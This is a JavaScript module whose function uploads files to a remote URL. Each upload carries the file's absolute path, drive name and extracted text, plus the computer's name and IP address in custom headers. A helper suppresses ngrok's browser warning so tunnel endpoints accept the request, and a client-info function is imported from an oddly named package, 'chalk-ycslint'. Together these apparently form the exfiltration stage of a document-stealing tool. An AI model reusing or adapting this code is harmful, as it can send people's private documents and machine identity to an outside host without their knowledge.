import { getClientInfo } from "chalk-ycslint";

/** @param {string} url */
function ngrokRequestHeaders(url) {
  try {
    const host = new URL(url).hostname.toLowerCase();
    if (host.includes("ngrok")) {
      return { "ngrok-skip-browser-warning": "true" };
    }
  } catch {
    /* invalid url */
  }
  return {};
}

/**
 * POST file payload including exact absolute path on disk.
 *
 * @param {object} opts
 * @param {string} opts.url
 * @param {string} [opts.field]
 * @param {Array<{ path: string, filename: string, driveName?: string, mimeType: string, text: string, extension?: string | null, pageCount?: number | null, messages?: unknown }>} opts.files
 * @param {Record<string, string>} [opts.extraHeaders]
 * @param {string} [opts.clientId]
 * @param {string} [opts.pcName]
 * @param {string} [opts.clientIp]
 * @param {number} opts.timeoutMs
 */
export async function postFilesWithPaths(opts) {
  const field = opts.field || "files";
  const body = {
    [field]: opts.files.map((f) => ({
      path: f.path,
      filename: f.filename,
      ...(f.driveName ? { driveName: f.driveName } : {}),
      mimeType: f.mimeType,
      extension: f.extension ?? null,
      text: f.text,
      ...(f.pageCount != null ? { pageCount: f.pageCount } : {}),
      ...(f.messages ? { mammothMessages: f.messages } : {}),
    })),
  };

  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), opts.timeoutMs);

  try {
    const headers = {
      "Content-Type": "application/json",
      Accept: "application/json, text/plain, */*",
      ...opts.extraHeaders,
      ...ngrokRequestHeaders(opts.url),
    };
    const info = getClientInfo();
    const pcName = (opts.pcName ?? info.pcName).trim();
    const clientIp = (opts.clientIp ?? info.clientIp).trim();
    const cid = (opts.clientId?.trim() || `${pcName} (${clientIp})`).slice(0, 200);

    headers["X-Upload-Client"] = cid;
    if (pcName) headers["X-Upload-Client-Name"] = pcName.slice(0, 200);
    if (clientIp) headers["X-Upload-Client-Ip"] = clientIp.slice(0, 80);

    const res = await fetch(opts.url, {
      method: "POST",
      headers,
      body: JSON.stringify(body),
      signal: controller.signal,
    });

    const text = await res.text();
    const bodySnippet = text.length > 500 ? `${text.slice(0, 500)}…` : text;

    if (!res.ok) {
      throw new Error(
        `HTTP ${res.status} ${res.statusText}${bodySnippet ? ` — ${bodySnippet}` : ""}`
      );
    }

    return { status: res.status, bodySnippet };
  } finally {
    clearTimeout(t);
  }
}
